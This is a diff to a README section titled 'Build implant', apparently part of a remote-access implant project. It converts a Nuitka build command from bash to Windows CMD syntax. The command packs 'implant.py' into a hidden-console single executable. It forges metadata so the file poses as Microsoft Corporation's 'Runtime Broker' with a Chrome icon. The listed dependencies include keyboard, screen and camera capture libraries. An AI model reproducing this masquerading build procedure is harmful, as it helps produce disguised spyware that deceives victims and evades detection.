@@ -37,21 +37,21 @@ pip install flask mss pillow opencv-python psutil pynput nuitka ordered-set zsta
 ## Build implant
 Edit `HOST` in `implant.py` if needed (default `192.168.122.1`).
 
+IN Windows in CMD:
 ```bash
-source venv/bin/activate
-nuitka \
-  --standalone \
-  --onefile \
-  --windows-disable-console \
-  --windows-company-name="Microsoft Corporation" \
-  --windows-product-name="Runtime Broker" \
-  --windows-file-description="Runtime Broker" \
-  --windows-file-version=10.0.19041.1 \
-  --windows-product-version=10.0.19041.1 \
-  --windows-icon-from-ico=chrome.ico \
-  --enable-plugin=anti-bloat \
-  --assume-yes-for-downloads \
-  --remove-output \
+nuitka ^
+  --standalone ^
+  --onefile ^
+  --windows-disable-console ^
+  --windows-company-name="Microsoft Corporation" ^
+  --windows-product-name="Runtime Broker" ^
+  --windows-file-description="Runtime Broker" ^
+  --windows-file-version=10.0.19041.1 ^
+  --windows-product-version=10.0.19041.1 ^
+  --windows-icon-from-ico=chrome.ico ^
+  --enable-plugin=anti-bloat ^
+  --assume-yes-for-downloads ^
+  --remove-output ^
   implant.py
 ```
 
